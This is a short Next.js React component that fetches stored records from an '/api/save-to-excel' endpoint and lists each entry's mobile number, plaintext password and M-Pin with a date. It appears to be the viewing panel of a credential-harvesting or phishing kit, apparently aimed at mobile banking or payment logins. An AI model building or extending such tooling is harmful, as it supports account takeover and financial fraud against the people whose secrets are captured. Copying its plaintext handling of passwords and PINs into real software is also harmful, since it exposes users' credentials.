"use client";
import NavBarHome from "@/components/NavBar";
import { useEffect, useState } from "react";

export default function UserList() {
  const [users, setUsers] = useState([]);

  useEffect(() => {
    async function fetchData() {
      const res = await fetch("/api/save-to-excel");
      const json = await res.json();
      if (json.success) {
        setUsers(json.data.reverse());
      }
    }
    fetchData();
  }, []);

  return (
    <div className="w-full mx-auto rounded-lg">
      <NavBarHome />

      {users.length === 0 ? (
        <p className="text-gray-500 text-center">No records found</p>
      ) : (
        <ul className="space-y-3 flex flex-col items-center w-full">
          {users.map((user, index) => (
            <li
              key={index}
              className="p-4 rounded-lg shadow flex flex-col sm:flex-row sm:justify-between w-full max-w-[450px]"
            >
              <div>
                <p className="font-semibold">📱 {user.Mobile}</p>
                <p className="text-sm text-black">🔑 {user.Password}</p>
                <p className="text-sm text-black">🔒 M-Pin: {user.Mpin}</p>
              </div>
              <div className="text-xs text-gray-400 mt-2 sm:mt-0">{user.Date}</div>
            </li>
          ))}
        </ul>
      )}
    </div>
  );
}
